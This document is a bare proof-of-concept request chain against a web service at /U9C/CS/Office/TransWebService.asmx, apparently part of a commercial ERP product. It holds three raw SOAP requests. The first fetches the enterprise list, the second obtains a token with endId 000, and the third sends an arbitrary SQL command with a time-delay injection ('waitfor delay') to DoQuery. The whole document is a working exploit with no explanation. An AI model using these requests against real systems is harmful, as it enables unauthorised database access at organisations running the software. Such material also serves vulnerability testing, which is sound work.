```
POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: 309
SOAPAction: "http://tempuri.org/GetEnterprise"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetEnterprise xmlns="http://tempuri.org/" />
</soap:Body>
</soap:Envelope>



POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: 345
SOAPAction: "http://tempuri.org/GetToken"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetToken xmlns="http://tempuri.org/">
<endId>000</endId>
</GetToken>
</soap:Body>
</soap:Envelope>




POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: 345
SOAPAction: "http://tempuri.org/DoQuery"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<DoQuery xmlns="http://tempuri.org/">
<token></token>
<command>select 1;waitfor delay '0:0:1' --</command>
</DoQuery>
</soap:Body>
</soap:Envelope>
```

